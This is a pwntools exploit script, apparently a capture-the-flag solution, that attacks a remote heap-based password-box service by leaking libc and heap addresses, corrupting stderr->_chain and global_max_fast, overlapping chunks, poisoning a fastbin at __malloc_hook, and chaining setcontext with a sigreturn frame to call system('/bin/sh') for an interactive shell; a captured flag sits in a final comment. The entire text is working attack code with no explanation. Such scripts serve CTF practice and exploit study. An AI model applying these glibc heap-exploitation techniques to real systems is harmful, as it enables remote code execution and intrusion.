from pwn import *

p = remote('47.104.71.220','49261')
#p = process('./pwdPro')
elf = ELF('./pwdPro')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def Add(idx,size,con):
    p.sendlineafter('Input Your Choice:',str(1))
    p.sendlineafter('Which PwdBox You Want Add:',str(idx))
    p.sendlineafter('Input The ID You Want Save:',str(idx))
    p.sendlineafter('Length Of Your Pwd:',str(size))
    p.sendlineafter('Your Pwd:',con)

def Edit(idx,con):
    p.sendlineafter('Input Your Choice:',str(2))
    sleep(0.2)
    p.sendline(str(idx))
    sleep(0.2)
    p.send(con)

def Show(idx):
    p.sendlineafter('Input Your Choice:',str(3))
    p.sendlineafter('Which PwdBox You Want Check:',str(idx))

def Delete(idx):
    p.sendlineafter('Input Your Choice:',str(4))
    p.sendlineafter('Idx you want 2 Delete:',str(idx))

def Recover(idx):
    p.sendlineafter('Input Your Choice:',str(5))
    p.sendlineafter('Idx you want 2 Recover:',str(idx))

def debug():
    #gdb.attach(p,'b *'+str(0x555555554000+addr))
    gdb.attach(p,'b *0x7ffff7e53b30')
    pause()


#context.log_level = 'debug'
#debug()
Add(0,0x458,'A'*0x10)
p.recvuntil('Save ID:')
num = u64(p.recv(8))^0x4141414141414141
print('number: '+hex(num))
Add(1,0x500,'A'*0x10)
Add(2,0x468,'A'*0x10)
Add(3,0x500,'A'*0x10)
Add(4,0x500,'A'*0x10)
Add(5,0x500,'A'*0x10)
Add(6,0x500,'A'*0x10)
Add(7,0x500,'A'*0x10)
Add(8,0x500,'A'*0x10)

Delete(2)
Recover(2)
Show(2)
p.recvuntil('Pwd is: ')
libc_base = (u64(p.recv(8))^num)-libc.sym['__malloc_hook']-0x10-96
p.info('libc_base: '+hex(libc_base))

Add(9,0x600,'A'*0x10) #2->largebin
Show(2)
p.recvuntil('Pwd is: ')
p.recv(0x10)
heap_base = (u64(p.recv(8))^num)-0xc00
p.info('heap_base: '+hex(heap_base))

Delete(0)

# hijack stderr->_chain = chunk2
Edit(2,p64(0)*3+p64(0x1ec628+libc_base-0x20))#stderr->_chain
Add(10,0x448,'A'*0x10)
Delete(10)

# hijack global_max_fast = chunk2
Edit(2,p64(0)*3+p64(0x1eeb80+libc_base-0x20))#global_max_fast
Add(11,0x448,'A'*0x10)

#chunk overlapping
Edit(3,b'A'*0x40+p64(0)+p64(0x511))
Edit(4,b'A'*0x30+p64(0)+p64(0x21)*10)

Delete(3)
Recover(3)
Edit(3,p64(heap_base+0x10c0))

Add(12,0x500,b'A'*0x40+p64(0^num)+p64(0x511^num))
Add(13,0x500,'A'*0x10)
Edit(4,b'A'*0x90+p64(0)+p64(0x471))
Edit(13,b'A'*0x4b0+p64(0)+p64(0xa1))

#fastbin attack
Delete(4)
Recover(4)
Edit(4,p64(libc.sym["__malloc_hook"]+libc_base-0x10)+p64(0))

Delete(4)
Recover(4)
Edit(4,p64(libc.sym["__malloc_hook"]+libc_base-0x10)+p64(0))

one = [0xe6e73,0xe6e76,0xe6e79]

payload = p64(0x580dd+libc_base)+p64(0x21) #setcontext
#payload = p64(one[0]+libc_base)+p64(0x21)
Recover(0)
Edit(0,payload*50)

#malloc(0x90)
payload = p64(0)*2+p64(0)+p64(heap_base+0x29d0)+p64(0) #write
payload += p64(heap_base+0x10+0x290)+p64(heap_base+22+0x10+0x290)+p64(0)*4
payload += p64(heap_base+0x1a90)+p64(0)+p64(0)+b"\x00"*8
payload += p64(0)*4+b"\x00"*48
payload += p64(0x1ed560+libc_base)
Edit(2,payload)
#malloc(0x90) && set malloc_hook = setcontext
payload = p64(0)*2+p64(0)+p64(heap_base+0x29d0)+p64(0) #write
payload += p64(heap_base+0x30+0x290)+p64(heap_base+22+0x30+0x290)+p64(0)*4
payload += p64(heap_base+0x1fa0)+p64(0)+p64(0)+b"\x00"*8
payload += p64(0)*4+b"\x00"*48
payload += p64(0x1ed560+libc_base)
Edit(5,payload)
#trigger && rdx = QWORD PTR [rdi+0x28] = heap_base+0x29d0
payload = p64(0)*2+p64(0)+p64(heap_base+0x29d0)+p64(0) #write
payload += p64(heap_base+0x50+0x290)+p64(heap_base+22+0x50+0x290)+p64(0)*4
payload += p64(heap_base+0x1fa0)+p64(0)+p64(0)+b"\x00"*8
payload += p64(0)*4+b"\x00"*48
payload += p64(0x1ed560+libc_base)
Edit(6,payload)


free_hook = libc_base+libc.sym["__free_hook"]
system = libc_base + libc.sym['system']
free_hook1 = free_hook&0xfffffffffffff000
syscall = libc_base+0x0000000000066229
Edit(1,'/bin/sh\x00')
#fakeframe
context.arch = 'amd64'
frame = SigreturnFrame()
frame.rdi = heap_base+0x700
frame.rsi = 0
frame.rdx = 0
frame.rsp = free_hook1-0x8
frame.rip = system
Edit(8,bytes(frame))



p.sendlineafter('Input Your Choice:',str(6))


p.interactive()
#flag{909cf735-b274-4098-885b-589300839b71}